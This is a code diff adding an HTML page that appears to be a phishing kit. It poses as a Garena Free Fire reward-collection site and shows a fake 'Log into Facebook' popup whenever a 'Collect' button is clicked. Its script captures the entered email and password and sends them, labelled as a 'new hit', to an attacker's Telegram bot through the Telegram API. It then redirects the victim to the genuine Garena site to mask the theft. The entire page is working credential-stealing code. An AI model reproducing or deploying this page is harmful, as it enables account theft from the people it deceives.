@@ -1,0 +1,245 @@
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+    &lt;meta charset="UTF-8"&gt;
+    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0"&gt;
+    &lt;style&gt;
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; background-color: #f7f7f7; }
+
+        .navbar {
+            width: 100%;
+            height: 70px;
+            background-image: url('https://i.ibb.co/HNzZ727/Screenshot-20241120-220242-1.png');
+            background-size: cover;
+            background-repeat: no-repeat;
+            display: flex;
+            align-items: center;
+            padding: 0 15px;
+        }
+
+        .navbar img {
+            height: 50px;
+            width: auto;
+        }
+
+        .noisy-image, .bottom-image {
+            display: block;
+            margin: 10px auto;
+            max-width: 100%;
+            height: auto;
+        }
+
+        .claim-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; width: 90%; max-width: 1200px; }
+        .claim-item { text-align: center; }
+        .claim-item img { max-width: 180px; width: 100%; margin-bottom: 10px; pointer-events: none; }
+
+        .collect-button { cursor: pointer; transition: transform 0.2s ease; }
+        .collect-button:hover { transform: scale(1.1); }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            background: white;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            border-radius: 10px;
+            z-index: 1000;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .modal-header {
+            font-size: 18px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+
+        .modal input {
+            width: 90%;
+            margin-bottom: 10px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .modal button {
+            width: 90%;
+            padding: 10px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+
+        .modal button:hover {
+            background-color: #145db2;
+        }
+
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+
+        .facebook-logo {
+            width: 40px;
+            height: auto;
+            margin-bottom: 15px;
+        }
+    &lt;/style&gt;
+    &lt;title&gt;Custom Facebook Login Popup&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+
+<div>
+    <img src="https://i.ibb.co/pdgR01r/garena.png" alt="garena">
+</div>
+
+<img src="https://i.ibb.co/s5XfmQK/noisy.jpg" alt="Noisy">
+
+<div>
+    <div>
+        <img src="https://i.ibb.co/vqsLhxV/9.jpg" alt="Reward 9">
+        <a href>
+            <img src="https://i.ibb.co/72hQYgz/Picsart-24-11-20-22-15-54-417.png" alt="Collect">
+        </a>
+    </div>
+    <div>
+        <img src="https://i.ibb.co/JBJKJvw/8.jpg" alt="Reward 8">
+        <a href>
+            <img src="https://i.ibb.co/72hQYgz/Picsart-24-11-20-22-15-54-417.png" alt="Collect">
+        </a>
+    </div>
+    <div>
+        <img src="https://i.ibb.co/Vg6gLWz/7.jpg" alt="Reward 7">
+        <a href>
+            <img src="https://i.ibb.co/72hQYgz/Picsart-24-11-20-22-15-54-417.png" alt="Collect">
+        </a>
+    </div>
+    <div>
+        <img src="https://i.ibb.co/LtmTPMp/5.jpg" alt="Reward 5">
+        <a href>
+            <img src="https://i.ibb.co/72hQYgz/Picsart-24-11-20-22-15-54-417.png" alt="Collect">
+        </a>
+    </div>
+    <div>
+        <img src="https://i.ibb.co/DVRztXp/6.jpg" alt="Reward 6">
+        <a href>
+            <img src="https://i.ibb.co/72hQYgz/Picsart-24-11-20-22-15-54-417.png" alt="Collect">
+        </a>
+    </div>
+    <div>
+        <img src="https://i.ibb.co/FJMhF8t/4.jpg" alt="Reward 4">
+        <a href>
+            <img src="https://i.ibb.co/72hQYgz/Picsart-24-11-20-22-15-54-417.png" alt="Collect">
+        </a>
+    </div>
+    <div>
+        <img src="https://i.ibb.co/QHXRdHt/3.jpg" alt="Reward 3">
+        <a href>
+            <img src="https://i.ibb.co/72hQYgz/Picsart-24-11-20-22-15-54-417.png" alt="Collect">
+        </a>
+    </div>
+    <div>
+        <img src="https://i.ibb.co/mTW3tgX/2.jpg" alt="Reward 2">
+        <a href>
+            <img src="https://i.ibb.co/72hQYgz/Picsart-24-11-20-22-15-54-417.png" alt="Collect">
+        </a>
+    </div>
+    <div>
+        <img src="https://i.ibb.co/9ySYK20/1.jpg" alt="Reward 1">
+        <a href>
+            <img src="https://i.ibb.co/72hQYgz/Picsart-24-11-20-22-15-54-417.png" alt="Collect">
+        </a>
+    </div>
+</div>
+
+<img src="https://i.ibb.co/HNzZ727/Screenshot-20241120-220242-1.png" alt="Bottom Image">
+
+<div></div>
+<div>
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+    <div>Log into Facebook</div>
+    &lt;input type="email" id="email" placeholder="Email or phone number"&gt;
+    &lt;input type="password" id="password" placeholder="Password"&gt;
+    &lt;button onclick="sendToTelegramAndRedirect()"&gt;Log In&lt;/button&gt;
+</div>
+
+&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.4.0/axios.min.js"&gt;&lt;/script&gt;
+&lt;script&gt;
+    // Show modal on "Collect" button click
+    document.querySelectorAll('.collect-button').forEach(button =&gt; {
+        button.addEventListener('click', (event) =&gt; {
+            event.preventDefault();
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('loginModal').style.display = 'block';
+        });
+    });
+
+    // Close modal
+    document.getElementById('overlay').addEventListener('click', () =&gt; {
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('loginModal').style.display = 'none';
+    });
+
+    // Send data to Telegram bot and redirect
+    function sendToTelegramAndRedirect() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('xD');
+
+        if (!chatId) {
+            alert("Chat ID is missing from URL.");
+            return;
+        }
+
+        if (email && password) {
+            const telegramBotToken = "BOT TOKEN";
+            const date = new Date().toLocaleDateString();
+            const time = new Date().toLocaleTimeString();
+
+            const message = `
+𓆩𓆩 𝙷𝙸 𝚈𝙾𝚄 𝙷𝙰𝚅𝙴 𝙽𝙴𝚆 𝙷𝙸𝚃 ツ.𓆪𓆪
+
+🐉⊚-----------------------------------⊚🐉
+↝ 𝙿𝙰𝙶𝙴 » Free Fire 
+➥ 𝙻𝙾𝙶𝙸𝙽 𝙱𝚈  » Facebook 
+📧 ↝ 𝙴𝚖𝚊𝚒𝚕 » ${email}
+📟 ↝ 𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 » ${password}
+🏴 ↝ 𝙲𝚘𝚞𝚗𝚝𝚛𝚢 » INDIA 🇮🇳
+⏳ ↝ 𝙲𝚘𝚍𝚎 » +91 🇮🇳
+⏱ ↝ 𝚃𝚒𝚖𝚎 » ${time}
+📝 ↝ 𝙳𝚊𝚝𝚎 » ${date}
+🐉⊚-----------------------------------⊚🐉
+↝ ᴅᴇᴠ ʙʏ » @UNKNOWNxTG
+`;
+
+            axios.post(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                chat_id: chatId,
+                text: message
+            }).then(response =&gt; {
+                console.log("Message sent:", response.data);
+            }).catch(error =&gt; {
+                console.error("Error:", error);
+            });
+
+            window.location.href = 'https://ff.garena.com/en';
+        } else {
+            alert("Please enter both email and password.");
+        }
+    }
+&lt;/script&gt;
+
+&lt;/body&gt;
+&lt;/html&gt;
